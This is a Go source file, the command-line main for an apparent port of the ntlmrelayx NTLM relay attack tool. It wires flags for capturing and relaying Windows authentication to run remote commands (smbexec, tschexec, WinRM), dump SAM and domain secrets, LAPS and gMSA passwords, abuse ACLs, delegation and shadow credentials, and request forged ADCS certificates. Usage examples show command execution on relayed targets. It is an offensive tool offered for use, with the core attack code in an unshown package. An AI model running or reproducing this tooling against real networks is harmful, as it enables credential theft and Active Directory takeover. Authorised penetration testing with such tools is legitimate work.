// SPDX-License-Identifier: Apache-2.0

package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"gopacket/internal/build"
	"gopacket/pkg/relay"
)

func main() {
	// Target
	target := flag.String("t", "", "Target URL (smb://host, ldap://host, http://host, mssql://host, winrm://host, winrms://host)")
	targetFile := flag.String("tf", "", "Target file (one URL per line)")
	listen := flag.String("l", ":445", "Listen address for SMB server")

	// Attack
	attack := flag.String("attack", "", "Attack: samdump, secretsdump, shares, smbexec, tschexec, ldapdump, delegate, addcomputer, shadowcreds, aclabuse, adcs, mssqlquery, winrmexec, rpctschexec, icpr, laps, gmsa")
	command := flag.String("c", "", "Command to execute (smbexec/tschexec)")
	exeFile := flag.String("e", "", "Executable to upload and run")
	interactive := flag.Bool("i", false, "Interactive shell mode")

	// Server ports
	smbPort := flag.Int("smb-port", 445, "SMB server port")
	httpPort := flag.Int("http-port", 80, "HTTP server port")
	httpsPort := flag.Int("https-port", 443, "HTTPS server port")
	rawPort := flag.Int("raw-port", 6666, "RAW server port")
	wcfPort := flag.Int("wcf-port", 9389, "WCF (ADWS) server port")
	rpcPort := flag.Int("rpc-port", 135, "RPC server port")
	winrmPort := flag.Int("winrm-port", 5985, "WinRM (HTTP) server port")
	winrmsPort := flag.Int("winrms-port", 5986, "WinRM (HTTPS) server port")

	// Server toggles
	noSMBServer := flag.Bool("no-smb-server", false, "Disable SMB server")
	noHTTPServer := flag.Bool("no-http-server", false, "Disable HTTP server")
	noRawServer := flag.Bool("no-raw-server", false, "Disable RAW server")
	noWCFServer := flag.Bool("no-wcf-server", false, "Disable WCF server")
	noRPCServer := flag.Bool("no-rpc-server", false, "Disable RPC server")
	noWinRMServer := flag.Bool("no-winrm-server", false, "Disable WinRM servers")

	// TLS
	certFile := flag.String("cert", "", "TLS certificate for HTTPS")
	keyFile := flag.String("key", "", "TLS private key for HTTPS")
	bindIP := flag.String("ip", "", "Interface IP to bind servers")

	// LDAP options
	escalateUser := flag.String("escalate-user", "", "User to escalate")
	delegateAccess := flag.Bool("delegate-access", false, "RBCD delegation attack")
	shadowCredentials := flag.Bool("shadow-credentials", false, "Shadow credentials attack")
	shadowTarget := flag.String("shadow-target", "", "Shadow credentials target")
	addComputer := flag.String("add-computer", "", "Add computer account")
	noDump := flag.Bool("no-dump", false, "Skip domain dump")
	noDA := flag.Bool("no-da", false, "Skip Domain Admin escalation")
	noACL := flag.Bool("no-acl", false, "Disable ACL attacks")
	noValidatePrivs := flag.Bool("no-validate-privs", false, "Skip privilege enumeration")
	dumpLAPS := flag.Bool("dump-laps", false, "Dump LAPS passwords")
	dumpGMSA := flag.Bool("dump-gmsa", false, "Dump gMSA passwords")
	dumpADCS := flag.Bool("dump-adcs", false, "Enumerate ADCS info")
	addDNSRecord := flag.String("add-dns-record", "", "Add DNS record (NAME:IP format)")

	// ADCS options
	adcsAttack := flag.Bool("adcs", false, "Enable ADCS relay (ESC8)")
	template := flag.String("template", "", "Certificate template name")
	altName := flag.String("altname", "", "Subject Alternative Name for ESC1/ESC6")

	// RPC options
	rpcMode := flag.String("rpc-mode", "TSCH", "RPC attack mode: TSCH (Task Scheduler) or ICPR (Certificate Request)")
	icprCAName := flag.String("icpr-ca-name", "", "CA name for ICPR certificate request")

	// MSSQL options
	var queries multiFlag
	flag.Var(&queries, "q", "SQL query (can specify multiple)")

	// NTLM manipulation
	removeMIC := flag.Bool("remove-mic", false, "Remove MIC for cross-protocol relay (CVE-2019-1040)")
	ntlmv1 := flag.Bool("ntlmv1", false, "Force NTLMv1 for offline cracking")

	// SOCKS
	socksEnabled := flag.Bool("socks", false, "Enable SOCKS5 proxy")
	socksPort := flag.String("socks-port", "1080", "SOCKS5 port")
	httpAPIPort := flag.Int("http-api-port", 9090, "REST API port for SOCKS relay data")

	// Relay behavior
	keepRelaying := flag.Bool("keep-relaying", false, "Keep relaying after success")
	noMultiRelay := flag.Bool("no-multirelay", false, "Disable multi-host relay")
	randomTarget := flag.Bool("ra", false, "Randomize target selection")

	// General
	debug := flag.Bool("debug", false, "Enable debug output")
	lootDir := flag.String("loot", ".", "Loot directory")
	outputFile := flag.String("of", "", "Output file for hashes")
	ipv6 := flag.Bool("6", false, "IPv6 support")
	enumAdmins := flag.Bool("enum-local-admins", false, "Enumerate local admins on failed relay")

	// WPAD
	wpadHost := flag.String("wh", "", "WPAD proxy host")
	wpadAuthNum := flag.Int("wa", 1, "WPAD auth prompt count")
	serveImage := flag.String("serve-image", "", "Image to serve for WebDAV")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: ntlmrelayx [options] -t <target>\n\n")
		fmt.Fprintf(os.Stderr, "NTLM Relay - Captures authentication and relays to target\n\n")
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExamples:\n")
		fmt.Fprintf(os.Stderr, "  ntlmrelayx -t smb://192.168.1.10 -attack shares\n")
		fmt.Fprintf(os.Stderr, "  ntlmrelayx -t smb://192.168.1.10 -attack smbexec -c \"whoami\"\n")
		fmt.Fprintf(os.Stderr, "  ntlmrelayx -t ldap://dc01 -attack ldapdump\n")
		fmt.Fprintf(os.Stderr, "  ntlmrelayx -t ldap://dc01 --delegate-access\n")
		fmt.Fprintf(os.Stderr, "  ntlmrelayx -t winrm://192.168.1.10 -c \"whoami\"\n")
		fmt.Fprintf(os.Stderr, "  ntlmrelayx -t winrms://192.168.1.10 -i\n")
		fmt.Fprintf(os.Stderr, "  ntlmrelayx -t http://adcs-server --adcs --template User\n")
		fmt.Fprintf(os.Stderr, "  ntlmrelayx -t rpc://target -rpc-mode TSCH -c \"whoami\"\n")
		fmt.Fprintf(os.Stderr, "  ntlmrelayx -t rpc://adcs-server -rpc-mode ICPR -icpr-ca-name CORP-CA\n")
	}

	flag.Parse()

	if *target == "" && *targetFile == "" {
		flag.Usage()
		os.Exit(1)
	}

	if *debug {
		build.Debug = true
	}

	cfg := &relay.Config{
		TargetAddr:  *target,
		ListenAddr:  *listen,
		Attack:      *attack,
		Command:     *command,
		ExeFile:     *exeFile,
		Interactive: *interactive,

		// Server ports
		SMBPort:    *smbPort,
		HTTPPort:   *httpPort,
		HTTPSPort:  *httpsPort,
		RawPort:    *rawPort,
		WCFPort:    *wcfPort,
		RPCPort:    *rpcPort,
		WinRMPort:  *winrmPort,
		WinRMSPort: *winrmsPort,

		// Server toggles
		NoSMBServer:   *noSMBServer,
		NoHTTPServer:  *noHTTPServer,
		NoRawServer:   *noRawServer,
		NoWCFServer:   *noWCFServer,
		NoRPCServer:   *noRPCServer,
		NoWinRMServer: *noWinRMServer,

		// TLS
		CertFile: *certFile,
		KeyFile:  *keyFile,
		BindIP:   *bindIP,

		// LDAP options
		EscalateUser:      *escalateUser,
		DelegateAccess:    *delegateAccess,
		ShadowCredentials: *shadowCredentials,
		ShadowTarget:      *shadowTarget,
		AddComputer:       *addComputer,
		NoDump:            *noDump,
		NoDA:              *noDA,
		NoACL:             *noACL,
		NoValidatePrivs:   *noValidatePrivs,
		DumpLAPS:          *dumpLAPS,
		DumpGMSA:          *dumpGMSA,
		DumpADCS:          *dumpADCS,
		AddDNSRecord:      parseDNSRecord(*addDNSRecord),

		// ADCS
		ADCSAttack: *adcsAttack,
		Template:   *template,
		AltName:    *altName,

		// RPC
		RPCMode:    *rpcMode,
		ICPRCAName: *icprCAName,

		// MSSQL
		Queries: []string(queries),

		// NTLM manipulation
		RemoveMIC: *removeMIC,
		NTLMv1:    *ntlmv1,

		// SOCKS
		SOCKSEnabled: *socksEnabled,
		SOCKSAddr:    "127.0.0.1:" + *socksPort,
		APIPort:      *httpAPIPort,

		// Relay behavior
		KeepRelaying: *keepRelaying,
		NoMultiRelay: *noMultiRelay,
		RandomTarget: *randomTarget,

		// General
		Debug:      *debug,
		LootDir:    *lootDir,
		OutputFile: *outputFile,
		IPv6:       *ipv6,
		EnumAdmins: *enumAdmins,

		// WPAD
		WPADHost:    *wpadHost,
		WPADAuthNum: *wpadAuthNum,
		ServeImage:  *serveImage,
	}

	// Parse target file if provided
	if *targetFile != "" {
		targets, err := parseTargetFile(*targetFile)
		if err != nil {
			log.Fatalf("[-] Failed to parse target file: %v", err)
		}
		cfg.TargetList = targets
	}

	if err := relay.Run(cfg); err != nil {
		log.Fatalf("[-] %v", err)
	}
}

// multiFlag allows multiple -q flags
type multiFlag []string

func (f *multiFlag) String() string { return strings.Join(*f, ", ") }
func (f *multiFlag) Set(value string) error {
	*f = append(*f, value)
	return nil
}

func parseDNSRecord(s string) [2]string {
	if s == "" {
		return [2]string{}
	}
	parts := strings.SplitN(s, ":", 2)
	if len(parts) != 2 {
		return [2]string{s, ""}
	}
	return [2]string{parts[0], parts[1]}
}

func parseTargetFile(path string) ([]relay.TargetEntry, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	var targets []relay.TargetEntry
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		t, err := relay.ParseTargetURL(line)
		if err != nil {
			log.Printf("[-] Skipping invalid target: %s (%v)", line, err)
			continue
		}
		targets = append(targets, *t)
	}

	if len(targets) == 0 {
		return nil, fmt.Errorf("no valid targets in file")
	}

	return targets, nil
}
